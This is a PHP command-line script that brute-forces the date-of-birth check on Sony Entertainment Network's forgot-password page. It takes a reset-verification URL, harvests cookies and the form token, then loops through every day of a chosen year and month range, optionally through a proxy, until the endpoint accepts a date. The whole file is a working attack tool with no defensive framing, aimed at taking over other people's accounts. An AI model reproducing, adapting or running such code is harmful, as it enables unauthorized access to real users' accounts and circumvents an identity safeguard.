<?php
/**
 * @author Leon J
 * @since 2017/7/5
 */

try
{
	$inputs = initInput();

	$url = $inputs['url'];
	$startYear = (int)@$inputs['startYear'] ?: 1970;
	$endYear = (int)@$inputs['endYear'] ? min( date( 'Y' ) , $inputs['endYear'] ) : date( 'Y' );
	$startMonth = (int)@$inputs['startMonth'] ?: 1;
	$endMonth = (int)@$inputs['endMonth'] ?: 12;
	$proxy = @$inputs['proxy'];

	$connect = curl_init();
	$proxy && curl_setopt( $connect , CURLOPT_PROXY , $proxy );
	curl_setopt( $connect , CURLOPT_URL , $url );
	curl_setopt( $connect , CURLOPT_RETURNTRANSFER , true );
	curl_setopt( $connect , CURLOPT_HEADER , true );
	curl_setopt( $connect , CURLOPT_FOLLOWLOCATION , true );
	curl_setopt( $connect , CURLOPT_COOKIEFILE , 'cookie.txt' );
	curl_setopt(
		$connect ,
		CURLOPT_HTTPHEADER ,
		[
			'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36' ,
			'Upgrade-Insecure-Requests:	1' ,
			'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' ,
			'Accept-Encoding: deflate, sdch, br' ,
			'Accept-Language: en-US,en;q=0.8,it;q=0.6' ,
		]
	);

	$response = curl_exec( $connect );
	$curlInfo = curl_getinfo( $connect );

	if( stripos( $curlInfo['url'] , 'invalid' ) )
	{
		throw new \Exception( 'invalid validate url.' );
	}

	$headerSize = $curlInfo['header_size'];
	$headers = substr( $response , 0 , $headerSize );
	$response = substr( $response , $headerSize );
	curl_close( $connect );

	$cookie = parseCookie( $headers );
	$token = getToken( $response );

	$connect = curl_init();
	$proxy && curl_setopt( $connect , CURLOPT_PROXY , $proxy );
	curl_setopt( $connect , CURLOPT_RETURNTRANSFER , true );
	curl_setopt( $connect , CURLOPT_POST , true );
	curl_setopt(
		$connect ,
		CURLOPT_HTTPHEADER ,
		[
			'Cookie: ' . $cookie ,
			'Content-Type: application/x-www-form-urlencoded' ,
			'Referer: https://account.sonyentertainmentnetwork.com/external/forgot-password-verify-identity!input.action' ,
		]
	);

	for( $year = $startYear; $year <= $endYear; $year++ )
	{
		for( $month = $startMonth; $month <= $endMonth; $month++ )
		{
			for( $day = 1; $day <= 31; $day++ )
			{
				echo "try $year, $month, $day ... \n";

				curl_setopt(
					$connect ,
					CURLOPT_URL ,
					'https://account.sonyentertainmentnetwork.com/liquid/external/forgot-password-verify-identity.action'
				);
				curl_setopt(
					$connect ,
					CURLOPT_POSTFIELDS ,
					"struts.token.name=blah_token&blah_token=$token&verifyType=dob&account.yob=$year&account.mob=$month&account.dob=$day"
				);
				$response = curl_exec( $connect );

				if( !$response )
				{
					echo "found : $year, $month, $day !\n";
					return;
				}

				$token = getToken( $response );
			}
		}
	}
	curl_close( $connect );
	echo "not found in scope !\n";
}
catch( \Exception $e )
{
	echo $e->getMessage() , PHP_EOL;
}

/**
 * @param $headers
 * @return string
 */
function parseCookie( $headers )
{
	$cookies = [];
	foreach( explode( "\n" , $headers ) as $header )
	{
		if( strpos( $header , 'Set-Cookie' ) === 0 )
		{
			list( $cookie ) = explode( ';' , substr( $header , 12 ) );
			list( $key , $val ) = explode( '=' , $cookie );
			$cookies[$key] = $val;
		}
	}

	$cookiePairs = [];
	foreach( $cookies as $name => $value )
	{
		$cookiePairs[] = "$name=$value";
	}
	$cookie = implode( '; ' , $cookiePairs );
	return $cookie;
}

/**
 * @param $response
 * @return string
 */
function getToken( $response )
{
	preg_match( '/name="blah_token"\s*value="(?<token>.+?)"/' , $response , $match );
	return $match['token'];
}

/**
 * @return array
 * @throws Exception
 */
function initInput()
{
	global $argv;
	$inputs = [];
	foreach( array_slice( $argv , 1 ) as $valPair )
	{
		list( $key , $val ) = explode( '=' , $valPair , 2 );
		$inputs[$key] = $val;
	}

	if( empty( $inputs['url'] ) )
	{
		throw new \Exception( 'please specify the validate url.' );
	}
	return $inputs;
}
